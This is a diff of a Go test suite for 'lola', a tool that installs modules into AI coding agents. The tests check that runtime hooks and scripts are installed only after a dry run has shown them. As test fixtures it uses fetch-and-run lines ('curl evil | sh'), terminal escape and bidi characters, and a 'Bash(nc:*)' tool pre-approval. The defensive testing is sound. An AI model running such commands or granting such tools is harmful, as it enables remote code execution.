@@ -130,6 +130,239 @@ var _ = Describe("lola sync", func() {
 		Expect(os.WriteFile(manPath, append(b, []byte(entry)...), 0o644)).To(Succeed())
 	}
 
+	Describe("consent grants only what lola has shown you", func() {
+		hooky := func(command string) {
+			GinkgoHelper()
+			writeTree(filepath.Join(proj, "mods", "hooky"), map[string]string{".claude-plugin/plugin.json": `{"name":"hooky"}`, "commands/hooky.md": "hooky\n",
+				"hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"` + command + `"}]}]}}`})
+		}
+		settings := func() string {
+			GinkgoHelper()
+			b, err := os.ReadFile(filepath.Join(proj, ".claude", "settings.local.json"))
+			if os.IsNotExist(err) {
+				return ""
+			}
+			Expect(err).NotTo(HaveOccurred())
+			return string(b)
+		}
+		BeforeEach(func() {
+			hooky("echo hooky")
+			pull("  - name: hooky\n    source: mods/hooky\n")
+		})
+
+		DescribeTable("a dry run shows the hooks and remembers them, so --trust consents to them off a terminal",
+			func(display ...string) {
+				r := lola(append([]string{"sync", "-n", "--trust=entries,runtime-hooks"}, display...)...)
+				Expect(r.code).To(Equal(0), r.err)
+				Expect(r.out).To(ContainSubstring("echo hooky"), "the dry run prints the hook in full")
+				r = lola("sync", "--trust=entries,runtime-hooks")
+				Expect(r.code).To(Equal(0), r.err)
+				Expect(settings()).To(ContainSubstring("echo hooky"))
+			},
+			Entry("human"),
+			Entry("--plain", "--plain"),
+			Entry("--json", "--json"),
+		)
+
+		It("declines hooks lola has not shown you off a terminal, with how to see them, then installs them once its report showed them", func() {
+			r := lola("sync", "--trust=entries,runtime-hooks")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(settings()).NotTo(ContainSubstring("echo hooky"))
+			Expect(r.out).To(MatchRegexp(`hint: lola has not shown you these hooks; see them with lola sync --project --trust=entries,runtime-hooks --at hooky=sha256:[0-9a-f]{64} -n, ` +
+				`then run this again, or add --unseen to consent without seeing them: lola sync --project --trust=entries,runtime-hooks --at hooky=sha256:[0-9a-f]{64} --unseen\n`))
+			Expect(r.out).To(ContainSubstring("echo hooky"), "the report shows the hooks it declined")
+
+			r = lola("sync", "--trust=entries,runtime-hooks")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(settings()).To(ContainSubstring("echo hooky"))
+		})
+
+		It("declines hooks changed since lola showed them, and --unseen consents to them", func() {
+			Expect(lola("sync", "-n", "--trust=entries,runtime-hooks").code).To(Equal(0))
+			hooky("curl evil | sh")
+			r := lola("sync", "--trust=entries,runtime-hooks", "--json")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(settings()).NotTo(ContainSubstring("curl"))
+
+			hooky("curl other | sh")
+			r = lola("sync", "--trust=entries,runtime-hooks", "--unseen", "--force")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(settings()).To(ContainSubstring("curl other"))
+		})
+
+		DescribeTable("a pre-install hook is refused, recording nothing, until a dry run prints its body in full",
+			func(display ...string) {
+				hooked := filepath.Join(tmp, "hooked")
+				writeTree(hooked, map[string]string{"lola.yml": "name: hooked\nhooks: {pre-install: pre.sh}\n", "commands/h.md": "H\n",
+					"pre.sh": "#!/bin/sh\necho body-line-two\n"})
+				Expect(os.Chmod(filepath.Join(hooked, "pre.sh"), 0o755)).To(Succeed())
+				run := append([]string{"install", hooked, "-t", "claude-code", "--trust=hooks"}, display...)
+				for range 2 {
+					r := lola(run...)
+					Expect(r.code).To(Equal(1), r.err)
+					Expect(r.err).To(ContainSubstring("lola has not shown you this hook; see it with"))
+				}
+				r := lola(append(run, "-n")...)
+				Expect(r.code).To(Equal(0), r.err)
+				Expect(r.out).To(ContainSubstring("echo body-line-two"), "the body, open")
+				r = lola(run...)
+				Expect(r.code).To(Equal(0), r.err)
+			},
+			Entry("human"),
+			Entry("--plain", "--plain"),
+			Entry("--json", "--json"),
+		)
+
+		It("folds the body of a hook lola has shown you before", func() {
+			hooked := filepath.Join(tmp, "hooked")
+			writeTree(hooked, map[string]string{"lola.yml": "name: hooked\nhooks: {post-install: post.sh}\n", "commands/h.md": "H\n",
+				"post.sh": "#!/bin/sh\necho body-line-two\n"})
+			Expect(os.Chmod(filepath.Join(hooked, "post.sh"), 0o755)).To(Succeed())
+			r := lola("install", hooked, "-t", "claude-code", "-n")
+			Expect(r.out).To(ContainSubstring("    | echo body-line-two\n"))
+			r = lola("install", hooked, "-t", "claude-code", "-n")
+			Expect(r.out).NotTo(ContainSubstring("echo body-line-two"), "folded")
+			Expect(r.out).To(ContainSubstring("▸ post.sh: 2 lines"))
+		})
+
+		Describe("bodies", func() {
+			hooked := func(body string) string {
+				GinkgoHelper()
+				dir := filepath.Join(tmp, "hooked")
+				writeTree(dir, map[string]string{"lola.yml": "name: hooked\nhooks: {pre-install: pre.sh}\n", "commands/h.md": "H\n", "pre.sh": body})
+				Expect(os.Chmod(filepath.Join(dir, "pre.sh"), 0o755)).To(Succeed())
+				return dir
+			}
+
+			It("prints a tab as spaces to the next 8-column stop, and --json keeps the raw text", func() {
+				dir := hooked("#!/bin/sh\n\techo tab\n")
+				r := lola("install", dir, "-t", "claude-code", "-n")
+				Expect(r.out).To(ContainSubstring("    |         echo tab\n"))
+				r = lola("install", dir, "-t", "claude-code", "-n", "--json")
+				Expect(r.out).To(ContainSubstring(`"body": "#!/bin/sh\n\techo tab\n"`))
+			})
+
+			It("prints ESC and bidi characters in a body replaced, in human and --plain hook-line rows, and raw in --json", func() {
+				dir := hooked("#!/bin/sh\necho \x1b[2Jcleared \u202eevil\n")
+				r := lola("install", dir, "-t", "claude-code", "-n")
+				Expect(r.out).To(ContainSubstring("    | echo ?[2Jcleared ?evil\n"))
+				Expect(r.out).NotTo(ContainSubstring("\x1b"))
+				Expect(r.out).NotTo(ContainSubstring("\u202e"))
+				r = lola("install", dir, "-t", "claude-code", "-n", "--plain")
+				Expect(r.out).To(ContainSubstring("hook-line\thooked\tpre-install\tpre.sh\techo ?[2Jcleared ?evil\n"))
+				r = lola("install", dir, "-t", "claude-code", "-n", "--json")
+				Expect(r.out).To(ContainSubstring(`"body": "#!/bin/sh\necho \u001b[2Jcleared ` + "\u202e" + `evil\n"`))
+			})
+
+			It("prints ESC and bidi characters in a project script's script-line rows replaced", func() {
+				b, err := os.ReadFile(manPath)
+				Expect(err).NotTo(HaveOccurred())
+				writeTree(proj, map[string]string{".lola/project.yml": "pre_install: ci/pre.sh\n" + string(b), "ci/pre.sh": "#!/bin/sh\necho \x1b]0;t\u202e\n"})
+				Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
+				r := lola("sync", "-n", "--trust=entries,scripts", "--plain")
+				Expect(r.out).To(ContainSubstring("\tci/pre.sh\techo ?]0;t?\n"))
+				Expect(r.out).NotTo(ContainSubstring("\x1b"))
+			})
+
+			DescribeTable("an empty hook is shown by its line",
+				func(display ...string) {
+					dir := hooked("")
+					Expect(lola(append([]string{"install", dir, "-t", "claude-code", "-n"}, display...)...).code).To(Equal(0))
+					r := lola("install", dir, "-t", "claude-code", "--trust=hooks")
+					Expect(r.err).To(ContainSubstring("→ hooks: hooked pre-install (new)"), "--trust consents to it")
+					Expect(r.err).NotTo(ContainSubstring("has not shown you"))
+				},
+				Entry("human"),
+				Entry("--plain", "--plain"),
+				Entry("--json", "--json"),
+			)
+
+			It("withholds a body too large to show, names the file, and only --unseen consents to it", func() {
+				dir := hooked("#!/bin/sh\n" + strings.Repeat("# filler\n", 8<<10))
+				r := lola("install", dir, "-t", "claude-code", "-n", "--trust=hooks")
+				Expect(r.out).To(MatchRegexp(`\(not shown: too large; inspect .*/pre\.sh; only --unseen consents to it\)\n`))
+				Expect(r.out).NotTo(ContainSubstring("# filler"))
+				r = lola("install", dir, "-t", "claude-code", "--trust=hooks")
+				Expect(r.code).To(Equal(1))
+				Expect(r.err).To(MatchRegexp(`hint: lola cannot show you this hook \(too large\); inspect .*/pre\.sh, then consent to it unseen: lola install .* --unseen\n`))
+				Expect(lola("install", dir, "-t", "claude-code", "--trust=hooks", "--unseen").code).To(Equal(0))
+			})
+		})
+
+		Describe("a project's scripts when nothing needs installing", func() {
+			BeforeEach(func() {
+				Expect(lola("sync", "--trust=entries,runtime-hooks", "--unseen").code).To(Equal(0))
+				b, err := os.ReadFile(manPath)
+				Expect(err).NotTo(HaveOccurred())
+				writeTree(proj, map[string]string{".lola/project.yml": "pre_install: ci/pre.sh\npost_install: ci/post.sh\n" + string(b),
+					"ci/pre.sh": "#!/bin/sh\necho pre-body\n", "ci/post.sh": "#!/bin/sh\necho post-body\n"})
+				Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
+				Expect(os.Chmod(filepath.Join(proj, "ci", "post.sh"), 0o755)).To(Succeed())
+			})
+
+			DescribeTable("a dry run prints both, bodies in full, before its outcome, so the run its hint names consents",
+				func(display ...string) {
+					r := lola(append([]string{"sync", "-n", "--trust=entries,scripts"}, display...)...)
+					Expect(r.code).To(Equal(0), r.err)
+					Expect(r.out).To(And(ContainSubstring("echo pre-body"), ContainSubstring("echo post-body")))
+					r = lola("sync", "--trust=entries,scripts", "--json")
+					Expect(r.code).To(Equal(0), r.err)
+				},
+				Entry("human"),
+				Entry("-v", "-v"),
+				Entry("--plain", "--plain"),
+				Entry("--json", "--json"),
+			)
+
+			It("a dry run's trusted is what the same run grants", func() {
+				trusted := func(out string) []any {
+					GinkgoHelper()
+					var doc struct {
+						Trusted []any `json:"trusted"`
+					}
+					Expect(json.Unmarshal([]byte(out), &doc)).To(Succeed(), out)
+					return doc.Trusted
+				}
+				dry := lola("sync", "-n", "--trust=entries,scripts", "--json")
+				Expect(dry.code).To(Equal(0), dry.err)
+				run := lola("sync", "--trust=entries,scripts", "--json")
+				Expect(run.code).To(Equal(0), run.err)
+				Expect(trusted(run.out)).To(Equal(trusted(dry.out)))
+				Expect(trusted(run.out)).To(ContainElement(HaveKeyWithValue("item", "post-install ci/post.sh")))
+			})
+		})
+
+		It("--force consents to nothing lola has not shown you", func() {
+			r := lola("sync", "--trust=entries,runtime-hooks", "--force")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(settings()).NotTo(ContainSubstring("echo hooky"))
+		})
+
+		It("refuses --unseen without a consent kind, before anything is written, with the run that works", func() {
+			r := lola("sync", "--unseen", "--trust=entries")
+			Expect(r.code).To(Equal(1), r.err)
+			Expect(r.err).To(ContainSubstring("error: --unseen widens a consent kind of --trust (scripts, hooks, runtime-hooks), and --trust gives none\n"))
+			Expect(r.err).To(HaveSuffix("error: --unseen widens a consent kind of --trust (scripts, hooks, runtime-hooks), and --trust gives none\n  hint: lola sync --trust=entries\n"))
+			Expect(settings()).To(BeEmpty())
+		})
+
+		It("a run that printed the hooks but could not remember them still succeeds, and says so", func() {
+			Expect(os.MkdirAll(filepath.Join(tmp, "state", "lola", "locks", "shown.lock"), 0o755)).To(Succeed())
+			r := lola("sync", "-n", "--trust=entries,runtime-hooks")
+			Expect(r.code).To(Equal(0), r.err)
+			Expect(r.out).To(ContainSubstring("echo hooky"))
+			Expect(r.err).To(ContainSubstring("lola could not remember what it showed you"))
+		})
+
+		It("a corrupt shown record is an error that says it can be deleted", func() {
+			writeTree(filepath.Join(tmp, "state", "lola"), map[string]string{"shown.json": "{"})
+			r := lola("sync", "--trust=entries,runtime-hooks")
+			Expect(r.code).NotTo(Equal(0))
+			Expect(r.err).To(ContainSubstring("shown.json is not a record lola can read"))
+			Expect(r.err).To(ContainSubstring("hint: it can be deleted safely: rm "))
+		})
+	})
+
 	It("has no alias, and names limit a run", func() {
 		r := lola("sync", "--help")
 		Expect(r.code).To(Equal(0), r.err)
@@ -160,7 +393,7 @@ var _ = Describe("lola sync", func() {
 		pull("  - name: other\n    source: mods/other\n")
 		r := lola("sync", "kit", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(Equal("⚠ 1 other module is not in sync: other → lola sync --project\n✓ kit already in sync\n"))
+		Expect(r.out).To(Equal("Notices:\n⚠ 1 other module is not in sync: other → lola sync --project\n✓ kit already in sync\n"))
 		r = lola("sync", "kit", "-n", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
 		Expect(r.out).To(HaveSuffix("→ kit already in sync\n"))
@@ -358,7 +591,7 @@ var _ = Describe("lola sync", func() {
 		turnOn("project:team")
 		r := lola("sync", "-C", proj, "--trust")
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(MatchRegexp(`pins:\n  → arch \(project:team\) pinned sha256:[0-9a-f]{64}\n`))
+		Expect(r.out).To(MatchRegexp(`✓ synced arch \(project:team\) pinned sha256:[0-9a-f]{64} \(claude-code\)\n`))
 	})
 
 	It("names a module left as installed once in the answer's echo, though both files change it", func() {
@@ -425,7 +658,7 @@ var _ = Describe("lola sync", func() {
 
 		r = lola("sync", "--trust", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(HaveSuffix("✓ synced srv (claude-code)\n✓ 1 unchanged\n"), "kit is unchanged")
+		Expect(r.out).To(ContainSubstring("✓ synced srv (claude-code)\n✓ 1 unchanged\n"), "kit is unchanged")
 		Expect(r.out).NotTo(ContainSubstring("srv MCP servers:"), "the diff on stderr showed them")
 	})
 
@@ -510,7 +743,7 @@ var _ = Describe("lola sync", func() {
 		writeTree(filepath.Join(proj, "mods", "big"), files)
 		pull("  - name: big\n    source: mods/big\n")
 
-		r := lola("sync", "big", "--force", "-n", "-C", proj)
+		r := lola("sync", "big", "--force", "-n", "-C", proj, "-v")
 		Expect(r.code).To(Equal(0), r.err)
 		_, plan, _ := strings.Cut(r.out, "plan (dry run")
 		Expect(strings.Count(plan, ".claude/commands/c")).To(Equal(40))
@@ -537,21 +770,23 @@ var _ = Describe("lola sync", func() {
 		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: other\n    source: mods/other\n"), 0o644)).To(Succeed())
 		r = lola("sync", "-n", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(HaveSuffix("→ to apply: lola sync -C "+proj+"\n→ off a terminal: lola sync -C "+proj+" --trust=entries\n"),
-			"removals add no -y you did not give; the scope is named from outside the project")
+		Expect(r.out).To(HaveSuffix("→ to apply: lola sync -C "+proj+"\n→ off a terminal: lola sync -C "+proj+" --trust=entries -y\n"),
+			"off a terminal its removals need -y; the scope is named from outside the project")
 
 		r = lola("sync", "-n", "-C", proj, "--json")
 		Expect(r.code).To(Equal(0), r.err)
 		var out map[string]any
 		Expect(json.Unmarshal([]byte(r.out), &out)).To(Succeed())
-		Expect(out).To(HaveKeyWithValue("equivalent_commands", []any{"lola sync -C " + proj + " --trust=entries"}))
+		Expect(out).To(HaveKeyWithValue("equivalent_commands", []any{"lola sync -C " + proj + " --trust=entries -y"}))
+		off := lola(strings.Fields(strings.TrimPrefix(out["equivalent_commands"].([]any)[0].(string), "lola "))...)
+		Expect(off.code).To(Equal(0), off.err)
+		Expect(lola("sync", "-n", "-C", proj).out).To(Equal("→ already in sync\n"), "the command it printed applied it off a terminal")
 
-		r = lola("sync", "-C", proj, "--json", "--trust", "-y")
+		r = lola("sync", "-C", proj, "--json")
 		Expect(r.code).To(Equal(0), r.err)
 		out = nil
 		Expect(json.Unmarshal([]byte(r.out), &out)).To(Succeed())
 		Expect(out).To(HaveKeyWithValue("equivalent_commands", []any{}), "only a dry run has one")
-		Expect(lola("sync", "-n", "-C", proj).out).To(Equal("→ already in sync\n"), "nothing to apply, no command")
 	})
 
 	It("starts every --plain row at column 1, in sync and install", func() {
@@ -664,6 +899,35 @@ var _ = Describe("lola sync", func() {
 				"env": []any{}, "headers": []any{"Authorization: Bearer ${GITHUB_TOKEN}"}, "cwd": ""}))
 	})
 
+	It("names the tools a module adds as pre-approved in the trust diff, per component, in text and JSON", func() {
+		skill := func(tools string) map[string]string {
+			return map[string]string{"lola.yml": "name: tools\n",
+				"commands/t.md": "---\ndescription: t\nallowed-tools: " + tools + "\n---\nT\n"}
+		}
+		writeTree(filepath.Join(proj, "mods", "tools"), skill("[Read]"))
+		pull("  - name: tools\n    source: mods/tools\n")
+		r := lola("sync", "-n", "-C", proj)
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(r.out).To(ContainSubstring("      pre-approves in command t: Read\n"), "a new module's tools are all new")
+
+		Expect(lola("sync", "-C", proj, "--trust").code).To(Equal(0))
+		writeTree(filepath.Join(proj, "mods", "tools"), skill("[Read, \"Bash(nc:*)\"]"))
+		r = lola("sync", "-n", "-C", proj, "--update", "--json")
+		Expect(r.code).To(Equal(0), r.err)
+		var out map[string]any
+		Expect(json.Unmarshal([]byte(r.out), &out)).To(Succeed())
+		change := out["trust"].(map[string]any)["changes"].([]any)[0].(map[string]any)
+		Expect(change["pre_approved"]).To(Equal([]any{map[string]any{"kind": "command", "name": "t", "tools": []any{"Bash(nc:*)"}}}),
+			"Read was pre-approved before: only the new tool is named")
+
+		writeTree(filepath.Join(proj, "mods", "tools"), map[string]string{"lola.yml": "name: tools\n", "commands/t.md": "T\n"})
+		r = lola("sync", "-n", "-C", proj, "--update", "--json")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(json.Unmarshal([]byte(r.out), &out)).To(Succeed())
+		change = out["trust"].(map[string]any)["changes"].([]any)[0].(map[string]any)
+		Expect(change["pre_approved"]).To(Equal([]any{}), "never null")
+	})
+
 	It("prints pins and removals as --plain rows", func() {
 		f, err := os.Create(filepath.Join(proj, "mods", "arch.zip"))
 		Expect(err).NotTo(HaveOccurred())
@@ -755,7 +1019,7 @@ var _ = Describe("lola sync", func() {
 		r := lolaAsking(c, "sync", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
 		Expect(c.questions).To(Equal([]string{"trust", "Remove these and sync? No applies nothing"}))
-		Expect(strings.TrimPrefix(c.before[1], c.before[0])).To(HaveSuffix("removals:\n  ✗ kit: claude-code (whole module)\n      .claude/commands/kit.md\n"))
+		Expect(strings.TrimPrefix(c.before[1], c.before[0])).To(HaveSuffix("To remove:\n  ✗ kit: claude-code (whole module)\n      .claude/commands/kit.md\n"))
 		Expect(r.err).To(HaveSuffix("removals declined; the project was not changed. The changes you trusted are recorded; " +
 			"the next lola sync --project asks only about the removals.\n"))
 		Expect(filepath.Join(proj, ".claude", "commands", "kit.md")).To(BeARegularFile())
@@ -857,6 +1121,76 @@ var _ = Describe("lola sync", func() {
 		Expect(r.err).To(ContainSubstring("→ the same off a terminal: lola sync --project b --trust=entries\n"))
 	})
 
+	It("the equivalent command carries the runtime hook consent given at the question, and none for answers it cannot repeat", func() {
+		for _, m := range []string{"hooky", "hooks2"} {
+			writeTree(filepath.Join(proj, "mods", m), map[string]string{
+				".claude-plugin/plugin.json": `{"name":"` + m + `"}`,
+				"commands/" + m + ".md":      m + "\n",
+				"hooks/hooks.json":           `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo ` + m + `"}]}]}}`,
+			})
+		}
+		pull("  - name: hooky\n    source: mods/hooky\n")
+		c := &confirming{trusts: []engine.TrustAnswer{{All: true}}, scripted: scripted{consent: []bool{true}}}
+		r := lolaAsking(c, "sync", "--project")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(r.err).To(ContainSubstring("→ the same off a terminal: lola sync --project --trust=entries,runtime-hooks\n"), "no --at pins the consent")
+
+		// Run off a terminal after the module changed, the command applies the change.
+		writeTree(filepath.Join(proj, "mods", "hooky"), map[string]string{"commands/hooky.md": "hooky changed\n"})
+		r = lola("sync", "--project", "--trust=entries,runtime-hooks")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(os.ReadFile(filepath.Join(proj, ".claude", "commands", "hooky.md"))).To(Equal([]byte("hooky changed\n")))
+		Expect(os.ReadFile(filepath.Join(proj, ".claude", "settings.local.json"))).To(ContainSubstring("echo hooky"))
+
+		// A yes to one module's hooks and a no to another's: --trust=runtime-hooks would grant both,
+		// and without it the first are removed, so no command is printed.
+		Expect(os.RemoveAll(filepath.Join(tmp, "state", "lola", "consent.json"))).To(Succeed())
+		writeTree(filepath.Join(proj, "mods", "hooky"), map[string]string{"commands/hooky.md": "hooky v2\n"})
+		pull("  - name: hooks2\n    source: mods/hooks2\n")
+		c = &confirming{trusts: []engine.TrustAnswer{{All: true}}, scripted: scripted{consent: []bool{true, false}}}
+		r = lolaAsking(c, "sync", "--project")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(c.scripted.calls).To(HaveLen(2), "both modules' hooks were asked about")
+		Expect(r.err).NotTo(ContainSubstring("the same off a terminal"))
+	})
+
+	It("lists under Removed the runtime hooks a run declines that an earlier consent installed", func() {
+		hooky := filepath.Join(proj, "mods", "hooky")
+		writeTree(hooky, map[string]string{
+			".claude-plugin/plugin.json": `{"name":"hooky"}`,
+			"commands/hooky.md":          "hooky\n",
+			"hooks/hooks.json":           `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hooky"}]}]}}`,
+		})
+		settings := filepath.Join(proj, ".claude", "settings.local.json")
+		edit := func(body string) {
+			GinkgoHelper()
+			Expect(lola("install", hooky, "-t", "claude-code", "--trust=runtime-hooks", "--unseen", "-y").code).To(Equal(0))
+			Expect(settings).To(BeARegularFile())
+			writeTree(hooky, map[string]string{"commands/hooky.md": body}) // the consent was for the version installed
+		}
+		edit("hooky v2\n")
+		r := lola("update", "--project", "--trust=entries", "-n")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(r.out).To(ContainSubstring("To remove:\n  ✗ hooky: claude-code (unless you consent to its runtime hooks)\n      .claude/settings.local.json /hooks/Stop\n"))
+		r = lola("update", "--project", "--trust=entries", "-y")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(settings).NotTo(BeAnExistingFile())
+		Expect(r.out).To(ContainSubstring("Removed:\n  ✗ hooky: claude-code (runtime hooks declined)\n      .claude/settings.local.json /hooks/Stop\n"))
+		Expect(r.err).To(ContainSubstring("      runtime hook for claude-code on Stop, unchanged (consent needed again: the module changed): command: runs "),
+			"the trust diff says why an unchanged hook is declined")
+
+		edit("hooky v3\n")
+		r = lola("update", "--project", "--trust=entries", "-y", "--plain")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(r.out).To(ContainSubstring("remove\thooky\tclaude-code\t.claude/settings.local.json /hooks/Stop\tproject\n"))
+
+		edit("hooky v4\n")
+		r = lola("update", "--project", "--trust=entries,runtime-hooks", "-y")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(settings).To(BeARegularFile())
+		Expect(r.out).NotTo(ContainSubstring("Removed:"), "granted again, nothing is removed")
+	})
+
 	It("offers each change in the picker grouped by kind, and no Choose… when the top-level targets are the only change", func() {
 		writeTree(filepath.Join(proj, "mods", "fresh"), map[string]string{"lola.yml": "name: fresh\n", "commands/fresh.md": "Fresh\n"})
 		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code, opencode]\nmodules:\n"+
@@ -951,7 +1285,7 @@ var _ = Describe("lola sync", func() {
 
 		r = lola("sync", "--update", "--trust", "-C", proj)
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(MatchRegexp(`pins:\n  → arch re-pinned sha256:[0-9a-f]{64} \(--update\)\n`), "each pin once, its new digest only")
+		Expect(r.out).To(MatchRegexp(`✓ synced arch re-pinned sha256:[0-9a-f]{64} \(claude-code\)\n`), "each pin once, its new digest only")
 		Expect(r.out).NotTo(ContainSubstring("changed since lola last wrote it"))
 	})
 
@@ -981,9 +1315,16 @@ var _ = Describe("lola sync", func() {
 	It("prints the plan, pins, removals and findings before the synced and removed lines", func() {
 		writeTree(filepath.Join(proj, "mods", "arch"), map[string]string{"lola.yml": "name: arch\n", "commands/arch.md": "Arch\n"})
 		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: arch\n    source: mods/arch\n"), 0o644)).To(Succeed())
-		r := lola("sync", "-C", proj, "--trust", "-y")
+		r := lola("sync", "-C", proj, "--trust", "-y", "-v")
 		Expect(r.code).To(Equal(0), r.err)
-		Expect(r.out).To(MatchRegexp(`(?s)removals:\n.*✓ synced arch.*✓ removed kit\n$`))
+		Expect(r.out).To(MatchRegexp(`(?s)\nRemoved:\n  ✗ kit: claude-code \(whole module\)\n.*✓ synced arch.*✓ removed kit\n$`))
+		Expect(r.out).NotTo(ContainSubstring("To remove:"))
+
+		writeTree(filepath.Join(proj, "mods", "arch"), map[string]string{"lola.yml": "name: arch\n", "commands/arch.md": "Arch\n"})
+		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules: []\n"), 0o644)).To(Succeed())
+		r = lola("sync", "-C", proj, "-n")
+		Expect(r.code).To(Equal(0), r.err)
+		Expect(r.out).To(ContainSubstring("\nTo remove:\n  ✗ arch: claude-code (whole module)\n"), "a dry run removes nothing yet")
 	})
 
 	It("off a terminal, --trust alone does not confirm removals: -y does", func() {
@@ -1000,7 +1341,7 @@ var _ = Describe("lola sync", func() {
 			"skills/broken/notes.md": "no SKILL.md here\n"})
 		r := lola("install", filepath.Join(proj, "mods", "warn"), "-C", proj, "-t", "claude-code")
 		Expect(r.code).To(Equal(0), r.err)
-		r = lola("sync", "-C", proj)
+		r = lola("sync", "-C", proj, "-v")
 		Expect(r.code).To(Equal(0), r.err)
 		Expect(r.out).To(ContainSubstring("skills/broken has no SKILL.md; skipped"))
 		Expect(r.out).To(HaveSuffix("✓ already in sync\n"))
